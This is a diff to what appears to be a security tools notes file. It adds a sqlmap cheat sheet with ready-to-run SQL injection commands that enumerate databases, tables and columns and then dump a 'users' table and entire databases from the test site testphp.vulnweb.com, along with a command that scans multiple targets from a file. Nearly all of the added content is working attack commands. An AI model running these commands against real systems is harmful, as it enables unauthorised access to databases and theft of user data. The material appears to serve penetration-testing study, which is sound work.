@@ -7,3 +7,25 @@ NETSPARKER (Web)
 🔺Fuzzer (PL/SQL)  
 🔺Source code scanner Repscan (PL/SQL)  
 🔺Source code scanner Fortify (PL/SQL)
+
+
+sqlmap
+-------
+
+scan multiple target
+sqlmap -m /root/Desktop/s.txt --dbs --batch
+
+Databases
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
+
+Tables
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch
+
+Columns
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
+
+Get data from a table
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
+
+Dump All
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch
